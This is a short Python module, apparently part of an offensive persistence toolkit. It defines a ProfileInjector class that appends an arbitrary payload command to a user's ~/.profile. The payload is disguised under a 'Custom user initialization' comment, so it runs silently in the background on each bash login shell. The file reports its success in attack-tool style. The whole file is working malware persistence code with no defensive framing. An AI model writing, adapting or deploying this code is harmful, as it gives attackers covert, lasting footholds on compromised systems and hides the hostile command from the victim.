import os
from ..core import ShellProfilePersistence

class ProfileInjector(ShellProfilePersistence):
    def inject(self, payload_command: str):
        profile = f"{self.home_dir}/.profile"
        payload = f"""
# Custom user initialization
if [ "$BASH" ]; then
    {payload_command} &>/dev/null &
fi
"""

        try:
            with open(profile, 'a') as f:
                f.write(payload)

            print(f"[+] Payload injected into .profile")
            print(f"[+] File: {profile}")
            print(f"[+] Triggers: Login shells only")

            return {
                'method': 'profile_injection',
                'file': profile
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None